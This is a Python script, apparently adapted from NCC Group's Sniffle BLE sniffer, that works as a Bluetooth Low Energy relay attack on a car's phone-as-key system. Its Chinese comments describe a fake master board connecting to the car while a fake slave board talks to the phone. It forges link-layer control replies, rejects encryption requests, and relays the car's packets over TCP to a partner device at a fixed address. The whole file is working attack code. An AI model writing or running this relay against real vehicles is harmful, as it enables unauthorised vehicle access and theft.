#!/usr/bin/env python3

# Written by Sultan Qasim Khan
# Copyright (c) 2020, NCC Group plc
# Released as open source under GPLv3

import argparse, sys, binascii, socket, time, struct, threading
from sniffle_hw import SniffleHW, BLE_ADV_AA, PacketMessage, DebugMessage, StateMessage, SnifferState
from packet_decoder import DPacketMessage, AdvaMessage, AdvDirectIndMessage, AdvExtIndMessage, str_mac
from binascii import unhexlify, a2b_hex

# global variable to access hardware
hw = None
_aa = 0

tcp_socket = None
wait = True
zhuanfa = False


def thread_socket():
    global hw
    global wait
    global tcp_socket
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # tcp_socket.connect(('127.0.0.1', 9999))
    tcp_socket.connect(('192.168.110.72', 33333))
    while True:
        temp_data = tcp_socket.recv(2)
        recv_data = temp_data + tcp_socket.recv(temp_data[1])
        if len(recv_data) > 2:
            print('Socket接到的数据为：', recv_data.hex())
            if recv_data[2:7] == b"11111":
                recv_data = b""
                print("收到开始信号！")
                wait = False
            else:
                pdutype = recv_data[0] & 3
                hw.cmd_transmit(pdutype, recv_data[2:])
        time.sleep(0.1)


def main():
    global wait
    aparse = argparse.ArgumentParser(description="Connection initiator test script for Sniffle BLE5 sniffer")
    aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
    aparse.add_argument("-c", "--advchan", default=37, choices=[37, 38, 39], type=int,
                        help="Advertising channel to listen on")
    aparse.add_argument("-m", "--mac", default=None, help="Specify target MAC address")
    aparse.add_argument("-i", "--irk", default=None, help="Specify target IRK")
    aparse.add_argument("-l", "--longrange", action="store_const", default=False, const=True,
                        help="Use long range (coded) PHY for primary advertising")
    aparse.add_argument("-P", "--public", action="store_const", default=False, const=True,
                        help="Supplied MAC address is public")
    args = aparse.parse_args()

    th_server = threading.Thread(target=thread_socket, args=())
    th_server.start()
    print("等待手机连接从开发板")
    while wait:
        time.sleep(0.01)
    print("主开发板开始连接车")
    global hw
    hw = SniffleHW(args.serport)

    if args.mac is None and args.irk is None:
        print("Must specify target MAC address or IRK", file=sys.stderr)
        return
    if args.mac and args.irk:
        print("IRK and MAC filters are mutually exclusive!", file=sys.stderr)
        return
    if args.public and args.irk:
        print("IRK only works on RPAs, not public addresses!", file=sys.stderr)
        return

    # set the advertising channel (and return to ad-sniffing mode)
    hw.cmd_chan_aa_phy(args.advchan, BLE_ADV_AA, 2 if args.longrange else 0)

    # pause after sniffing
    hw.cmd_pause_done(False)

    # capture advertisements only
    hw.cmd_follow(False)

    # turn off RSSI filter
    hw.cmd_rssi()

    if args.mac:
        try:
            macBytes = [int(h, 16) for h in reversed(args.mac.split(":"))]
            if len(macBytes) != 6:
                raise Exception("Wrong length!")
        except:
            print("MAC must be 6 colon-separated hex bytes", file=sys.stderr)
            return
        hw.cmd_mac(macBytes, False)
    else:
        hw.cmd_irk(unhexlify(args.irk), False)

    # initiator doesn't care about this setting, it always accepts aux
    hw.cmd_auxadv(False)

    # initiator needs a MAC address
    hw.random_addr()
    # hw.cmd_setaddr(b"\x24\x28\x72\x51\x82\x54")

    # reset preloaded encrypted connection interval changes
    hw.cmd_interval_preload()

    if args.irk:
        macBytes = get_mac_from_irk()

    # zero timestamps and flush old packets
    hw.mark_and_flush()

    # now enter initiator mode
    global _aa
    _aa = hw.initiate_conn(macBytes, not args.public)
    hw.cmd_transmit(3, binascii.a2b_hex("08fff9000300000000"))
    while True:
        msg = hw.recv_and_decode()
        print_message(msg)


# assumes sniffer is already configured to receive ads with IRK filter
def get_mac_from_irk():
    hw.mark_and_flush()
    print("Waiting for advertisement with suitable RPA...")
    while True:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, AdvaMessage) or \
                isinstance(dpkt, AdvDirectIndMessage) or \
                (isinstance(dpkt, AdvExtIndMessage) and dpkt.AdvA is not None):
            print("Found target MAC: %s" % str_mac(dpkt.AdvA))
            return dpkt.AdvA


def print_message(msg):
    if isinstance(msg, PacketMessage):
        print_packet(msg)
    elif isinstance(msg, DebugMessage):
        print(msg)
    elif isinstance(msg, StateMessage):
        print(msg)
        if msg.new_state == SnifferState.MASTER:
            hw.decoder_state.cur_aa = _aa
    # print()


msg_ctr = 0
first_length_packt = True


def print_packet(pkt):
    global first_length_packt
    global tcp_socket
    global zhuanfa
    # Further decode and print the packet
    dpkt = DPacketMessage.decode(pkt)
    if dpkt.pdutype == "LL CONTROL":
        ctr_code = dpkt.body[2]
        if ctr_code == 0x13:  # ping
            pass
        elif ctr_code >= 0x1b:  # Opcode: RFU
            pass
        else:
            print("-" * 60)
            print("收到设备的控制包")
            print(dpkt)
            # 三个if elif后面的语句都会执行
            if ctr_code == 0x09:  # LL_FEATURE_RSP (0x09)
                hw.cmd_transmit(3, a2b_hex('14fb00480877004808'))  # LL_LENGTH_REQ (0x14)
            elif ctr_code == 0x0e:  # LL_SLAVE_FEATURE_REQ (0x0e)
                hw.cmd_transmit(3, a2b_hex('09b9f9000300000000'))  # LL_FEATURE_RSP (0x09)
            elif ctr_code == 0x15:  # LL_LENGTH_RSP (0x15)
                if first_length_packt:
                    first_length_packt = False
                    hw.cmd_transmit(3, a2b_hex('0c0b1d001e4d'))  # LL_VERSION_IND (0x0c)
                # else:
                # tcp_socket.send(dpkt.body)
            elif ctr_code == 0x03:  # LL_ENC_REQ (0x3)
                hw.cmd_transmit(3, a2b_hex('0d1a'))  # LL_REJECT_IND (0x0d)
    elif dpkt.pdutype == "LL DATA":
        print("-" * 60)
        print("收到设备的数据包")
        print(dpkt)
        l2cap_data = dpkt.body[2:]
        if l2cap_data == a2b_hex("03000400037300"):
            print("==========512 Server Rx MTU: 115==============")
            zhuanfa = True
        elif tcp_socket != None and zhuanfa:
            print("仿冒主发送给仿冒从：", dpkt.body.hex())
            tcp_socket.send(dpkt.body)
    else:
        pass
    # do a ping every fourth message
    global msg_ctr
    MCMASK = 3
    if (msg_ctr & MCMASK) == MCMASK:
        hw.cmd_transmit(3, b'\x12')  # LL_PING_REQ
    msg_ctr += 1

    # also test sending LL_CONNECTION_UPDATE_IND
    # if msg_ctr == 0x40:
    # WinSize = 0x04
    # WinOffset = 0x0008
    # Interval = 0x0030
    # Latency = 0x0003
    # Timeout = 0x0080
    # Instant = 0x0080
    # hw.cmd_transmit(3, b'\x00\x01\x03\x00\x24\x00\x00\x00\xf4\x01\x42\x00')
    # print("sent change!")


if __name__ == "__main__":
    main()
